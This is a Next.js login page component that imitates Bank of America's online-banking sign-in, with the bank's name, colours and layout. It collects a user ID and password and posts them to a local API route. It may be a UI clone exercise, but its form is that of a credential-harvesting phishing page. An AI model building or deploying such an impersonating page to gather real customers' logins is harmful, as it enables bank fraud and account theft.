'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Header from '@/app/components/Header';
import Footer from '@/app/components/Footer';
import Button from '@/app/components/ui/Button';
import Input from '@/app/components/ui/Input';
import Link from 'next/link';

export default function UserLoginPage() {
  const [onlineId, setOnlineId] = useState('');
  const [passcode, setPasscode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [saveOnlineId, setSaveOnlineId] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('/api/user/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ onlineId, passcode }),
      });

      const result = await response.json();

      if (result.success) {
        router.push('/dashboard');
      } else {
        setError('The information you entered does not match our records. Please try again.');
      }
    } catch (err) {
      setError('A system error occurred. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header variant="public" isLoginPage={true} />
      
      <main className="flex-1 bg-white">
        <div className="container mx-auto px-4 py-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-20 max-w-5xl mx-auto">
            {/* Left Column - Login Form */}
            <div className="w-full">
              {/* Red Banner */}
              <div className="bg-bofa-red text-white py-3.5 px-5 mb-5 w-full">
                <h2 className="text-base font-bold">Log In to Online Banking</h2>
              </div>

              {/* Login Form */}
              <form onSubmit={handleLogin} className="space-y-5">
                {error && (
                  <div className="p-4 bg-red-50 border border-red-200 rounded">
                    <p className="text-sm text-red-700">{error}</p>
                  </div>
                )}

                {/* User ID Field */}
                <div>
                  <label htmlFor="userId" className="block text-xs font-medium text-bofa-gray-700 mb-1.5">
                    User ID
                  </label>
                  <input
                    id="userId"
                    type="text"
                    value={onlineId}
                    onChange={(e) => setOnlineId(e.target.value)}
                    className="w-full px-3 py-2.5 border border-bofa-gray-500 rounded-sm focus:outline-none focus:ring-1 focus:ring-bofa-blue focus:border-bofa-blue text-sm"
                    required
                  />
                  <div className="mt-2.5 flex items-center">
                    <input
                      id="saveId"
                      type="checkbox"
                      checked={saveOnlineId}
                      onChange={(e) => setSaveOnlineId(e.target.checked)}
                      className="w-4 h-4 rounded border-bofa-gray-500 text-bofa-blue focus:ring-bofa-blue"
                    />
                    <label htmlFor="saveId" className="ml-2 text-xs text-bofa-gray-700">
                      Save this User ID
                    </label>
                    <button
                      type="button"
                      className="ml-1.5 text-bofa-blue hover:text-bofa-blue-dark"
                      aria-label="Help"
                    >
                      <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                {/* Password Field */}
                <div>
                  <label htmlFor="password" className="block text-xs font-medium text-bofa-gray-700 mb-1.5">
                    Password
                  </label>
                  <input
                    id="password"
                    type="password"
                    value={passcode}
                    onChange={(e) => setPasscode(e.target.value)}
                    className="w-full px-3 py-2.5 border border-bofa-gray-500 rounded-sm focus:outline-none focus:ring-1 focus:ring-bofa-blue focus:border-bofa-blue text-sm"
                    required
                  />
                  <div className="mt-2.5">
                    <Link href="#" className="text-xs text-bofa-blue hover:underline">
                      Forgot your Password?
                    </Link>
                  </div>
                </div>

                {/* Login Button */}
                <div className="pt-3">
                  <Button
                    type="submit"
                    variant="blue"
                    className="w-full py-2.5 px-4 font-semibold text-sm rounded-sm"
                    isLoading={isLoading}
                    leftIcon={
                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    }
                  >
                    Log In
                  </Button>
                </div>
              </form>
            </div>

            {/* Right Column - Promotional Content */}
            <div className="w-full space-y-6 pt-1">
              {/* App Promotion Section */}
              <div>
                <h3 className="text-sm font-semibold text-bofa-navy mb-3">Stay connected with our app</h3>
                <div className="flex items-start gap-5 mb-5">
                  {/* Phone Mockup */}
                  <div className="flex-shrink-0">
                    <div className="w-28 h-52 bg-white rounded-lg border-2 border-bofa-gray-300 relative overflow-hidden shadow-sm">
                      {/* Status Bar */}
                      <div className="absolute top-0 left-0 right-0 h-5 bg-bofa-gray-300 flex items-center justify-center">
                        <span className="text-[10px] text-bofa-gray-600 font-medium">9:41</span>
                      </div>
                      {/* App Content */}
                      <div className="absolute top-5 left-0 right-0 bottom-0 bg-white p-3 flex flex-col items-center justify-center">
                        <div className="flex flex-col items-center mb-2">
                          <div className="flex items-center gap-1 mb-1">
                            <span className="text-[10px] font-bold text-bofa-navy">BANK OF AMERICA</span>
                            <div className="w-3 h-3 rounded-sm overflow-hidden flex flex-col">
                              <div className="h-1/3 bg-bofa-red"></div>
                              <div className="h-1/3 bg-white border-y border-bofa-gray-200"></div>
                              <div className="h-1/3 bg-bofa-navy"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="flex-1 pt-1">
                    <p className="text-xs text-bofa-gray-700 mb-3 leading-relaxed">Secure, convenient banking anytime</p>
                    <Button
                      variant="danger"
                      className="bg-bofa-red hover:bg-bofa-red-dark text-white px-5 py-2 font-semibold text-xs rounded-sm"
                    >
                      Get the app
                    </Button>
                  </div>
                </div>
              </div>

              {/* Login Help Section */}
              <div className="border-t border-bofa-gray-300 pt-5">
                <h3 className="text-xs font-semibold text-bofa-navy mb-2.5">Login help</h3>
                <div className="space-y-1.5">
                  <Link href="#" className="block text-xs text-bofa-blue hover:underline">
                    Forgot ID/Password?
                  </Link>
                  <Link href="#" className="block text-xs text-bofa-blue hover:underline">
                    Problem logging in?
                  </Link>
                </div>
              </div>

              {/* Not Using Online Banking Section */}
              <div className="border-t border-bofa-gray-300 pt-5">
                <h3 className="text-xs font-semibold text-bofa-navy mb-2.5">Not using Online Banking?</h3>
                <div className="space-y-1.5">
                  <Link href="#" className="block text-xs text-bofa-blue hover:underline">
                    Enroll now
                  </Link>
                  <Link href="#" className="block text-xs text-bofa-blue hover:underline">
                    Learn more about Online Banking
                  </Link>
                  <Link href="#" className="block text-xs text-bofa-blue hover:underline">
                    Service Agreement
                  </Link>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer isLoginPage={true} />
    </div>
  );
}
